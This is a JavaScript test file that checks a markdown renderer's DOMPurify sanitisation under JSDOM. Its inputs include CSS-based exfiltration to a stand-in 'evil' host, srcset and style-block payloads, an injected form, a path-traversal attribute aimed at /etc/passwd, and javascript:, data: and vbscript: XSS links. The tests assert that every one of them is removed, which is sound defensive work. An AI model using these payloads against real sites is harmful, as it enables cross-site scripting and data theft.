// test/markdown-render-dom.test.js — integration test for the markdown
// renderer's full pipeline under JSDOM, with the vendored DOMPurify v3.
// Reviewer's MUST-ADD test (5494cab fix-up): proves renderInto reaches the
// fb-markdown-rendered wrapper (NOT the fb-md-fallback hard-failure path)
// AND verifies the security-critical sanitisation defences.
//
// Skips automatically when jsdom isn't installed so the unit-test suite
// still runs in environments where the dev dependency wasn't fetched.

'use strict';

const path = require('path');
const fs = require('fs');
const assert = require('assert');

let JSDOM = null;
try { JSDOM = require('jsdom').JSDOM; } catch (_) { /* will skip below */ }

const VENDOR_DIR = path.join(__dirname, '..', 'src', 'public', 'vendor');
const MD_RENDER_SRC = path.join(__dirname, '..', 'src', 'public', 'markdown-render.js');

(JSDOM ? describe : describe.skip)('markdown-render.js (JSDOM integration)', function () {
  this.timeout(15000);

  let window, document, container;

  beforeEach(function () {
    const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
      url: 'http://localhost/',
      pretendToBeVisual: true,
      runScripts: 'outside-only',
    });
    window = dom.window;
    document = window.document;

    // Load vendored marked + DOMPurify INTO the JSDOM window so the
    // renderer's `window.marked` / `window.DOMPurify` lookups resolve.
    const evalIn = (filePath) => {
      const src = fs.readFileSync(filePath, 'utf8');
      window.eval(src);
    };
    evalIn(path.join(VENDOR_DIR, 'purify.min.js'));
    evalIn(path.join(VENDOR_DIR, 'marked.min.js'));

    // Stub the lazy-load promise cache: pretend marked + DOMPurify are
    // already loaded so loadDependencies() short-circuits without trying
    // to inject <script> tags (which JSDOM won't actually execute).
    // Verified by markdown-render.js's own loadDependencies short-circuit.

    // Now load markdown-render.js into the same window so its IIFE
    // attaches window.markdownRender.
    evalIn(MD_RENDER_SRC);

    container = document.createElement('div');
    document.body.appendChild(container);
  });

  describe('CRITICAL — DOMPurify config does not crash', function () {
    it('renderInto reaches the fb-markdown-rendered wrapper (not fallback)', function (done) {
      window.markdownRender.renderInto(container, '# Hello\n\nworld').then(function (result) {
        try {
          assert.ok(result, 'renderInto should resolve with a result');
          assert.strictEqual(
            result.wrapper.className,
            'fb-markdown-rendered',
            'expected fb-markdown-rendered wrapper, got "' + result.wrapper.className +
              '" — innerHTML preview: ' + result.wrapper.innerHTML.slice(0, 200)
          );
          assert.ok(
            result.wrapper.innerHTML.indexOf('<h1') !== -1,
            'expected <h1> in rendered output: ' + result.wrapper.innerHTML.slice(0, 200)
          );
          assert.ok(
            result.wrapper.innerHTML.indexOf('<p>world</p>') !== -1 ||
              result.wrapper.innerHTML.indexOf('<p>world') !== -1,
            'expected <p>world</p>: ' + result.wrapper.innerHTML.slice(0, 200)
          );
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });

    it('inline content with no markdown still resolves to the rendered wrapper', function (done) {
      window.markdownRender.renderInto(container, 'plain text').then(function (result) {
        try {
          assert.strictEqual(result.wrapper.className, 'fb-markdown-rendered');
          assert.ok(result.wrapper.innerHTML.indexOf('plain text') !== -1);
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });
  });

  describe('HIGH — CSS exfiltration via inline style is blocked', function () {
    it('strips inline style attribute on <p>', function (done) {
      window.markdownRender.renderInto(container,
        '<p style="background-image:url(http://evil/?c=test)">x</p>'
      ).then(function (result) {
        try {
          assert.strictEqual(result.wrapper.className, 'fb-markdown-rendered');
          assert.ok(
            result.wrapper.innerHTML.indexOf('style=') === -1,
            'inline style should be stripped: ' + result.wrapper.innerHTML
          );
          assert.ok(
            result.wrapper.innerHTML.indexOf('background-image') === -1,
            'background-image url should be gone: ' + result.wrapper.innerHTML
          );
          assert.ok(
            result.wrapper.innerHTML.indexOf('http://evil') === -1,
            'attacker URL should not appear: ' + result.wrapper.innerHTML
          );
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });

    it('strips inline style on every element type (span, div, h1)', function (done) {
      window.markdownRender.renderInto(container,
        '<div style="display:none"><span style="color:red">x</span><h1 style="font-size:0">y</h1></div>'
      ).then(function (result) {
        try {
          assert.ok(result.wrapper.innerHTML.indexOf('style=') === -1,
            'no style attr should remain: ' + result.wrapper.innerHTML);
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });
  });

  describe('MEDIUM-1 — <img srcset> stripped', function () {
    it('removes srcset while keeping rewritten src', function (done) {
      window.markdownRender.renderInto(container,
        '<img src="./local.png" srcset="//evil.com/x.png 1x">',
        { basePath: '/home/user/docs' }
      ).then(function (result) {
        try {
          assert.strictEqual(result.wrapper.className, 'fb-markdown-rendered');
          var img = result.wrapper.querySelector('img');
          assert.ok(img, 'img should be present');
          assert.ok(!img.hasAttribute('srcset'),
            'srcset should be stripped: ' + img.outerHTML);
          assert.ok(result.wrapper.innerHTML.indexOf('evil.com') === -1,
            'attacker host should not appear anywhere: ' + result.wrapper.innerHTML);
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });
  });

  describe('MEDIUM-2 — <form>/<input>/<button>/<style> stripped', function () {
    it('strips <form> + nested <input>/<button>', function (done) {
      var html = '<form action="/api/files/content" method="POST">' +
        '<input name="path"><button>x</button></form>';
      window.markdownRender.renderInto(container, html).then(function (result) {
        try {
          assert.ok(result.wrapper.innerHTML.indexOf('<form') === -1, 'form gone');
          assert.ok(result.wrapper.innerHTML.indexOf('<input') === -1, 'input gone');
          assert.ok(result.wrapper.innerHTML.indexOf('<button') === -1, 'button gone');
          assert.ok(result.wrapper.innerHTML.indexOf('/api/files/content') === -1,
            'action URL gone');
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });

    it('strips <style> blocks (CSS-rule exfil belt-and-braces)', function (done) {
      window.markdownRender.renderInto(container,
        '<style>body{background:url(http://evil)}</style><p>hi</p>'
      ).then(function (result) {
        try {
          assert.ok(result.wrapper.innerHTML.indexOf('<style') === -1, 'style block gone');
          assert.ok(result.wrapper.innerHTML.indexOf('http://evil') === -1, 'evil URL gone');
          assert.ok(result.wrapper.innerHTML.indexOf('<p>hi</p>') !== -1, 'paragraph kept');
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });
  });

  describe('LOW-1 — user-injected data-fb-internal-path stripped before our write', function () {
    it('strips data-fb-internal-path on EXTERNAL <a> (no rewrite)', function (done) {
      window.markdownRender.renderInto(container,
        '<a href="https://example.com" data-fb-internal-path="../../etc/passwd">click</a>'
      ).then(function (result) {
        try {
          var anchor = result.wrapper.querySelector('a');
          assert.ok(anchor, 'anchor should be present');
          assert.ok(!anchor.hasAttribute('data-fb-internal-path'),
            'user-injected data-fb-internal-path must be stripped on external link: ' +
              anchor.outerHTML);
          assert.strictEqual(anchor.getAttribute('target'), '_blank',
            'external links open in new tab');
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });

    it('on INTERNAL relative <a>, our resolved value WINS over user-injected attr', function (done) {
      window.markdownRender.renderInto(container,
        '<a href="./README.md" data-fb-internal-path="../../etc/passwd">x</a>',
        { basePath: '/safe/dir' }
      ).then(function (result) {
        try {
          var anchor = result.wrapper.querySelector('a');
          assert.ok(anchor, 'anchor should be present');
          assert.strictEqual(
            anchor.getAttribute('data-fb-internal-path'),
            '/safe/dir/README.md',
            'our resolved path must replace the injected one'
          );
          assert.notStrictEqual(
            anchor.getAttribute('data-fb-internal-path'),
            '../../etc/passwd',
            'injected traversal path must not survive'
          );
          done();
        } catch (e) { done(e); }
      }).catch(done);
    });
  });

  describe('isInternalRelative XSS surface (regression)', function () {
    // These are caught by DOMPurify's URL gate first; this test is
    // belt-and-braces to ensure the renderer never produces an <a> with
    // a script-shaped href.
    var dangerous = [
      '[a](javascript:alert(1))',
      '[a](JaVaScRiPt:alert(1))',
      '[a](data:text/html,foo)',
      '[a](vbscript:msgbox(1))',
    ];
    dangerous.forEach(function (md) {
      it('blocks ' + md, function (done) {
        window.markdownRender.renderInto(container, md).then(function (result) {
          try {
            assert.strictEqual(result.wrapper.className, 'fb-markdown-rendered');
            var anchor = result.wrapper.querySelector('a');
            // Anchor may or may not exist; if it does, href must NOT carry
            // the dangerous scheme.
            if (anchor) {
              var href = anchor.getAttribute('href') || '';
              assert.ok(
                href.indexOf('javascript:') === -1 &&
                href.indexOf('data:text/html') === -1 &&
                href.indexOf('vbscript:') === -1,
                'dangerous href survived: ' + href
              );
            }
            done();
          } catch (e) { done(e); }
        }).catch(done);
      });
    });
  });
});
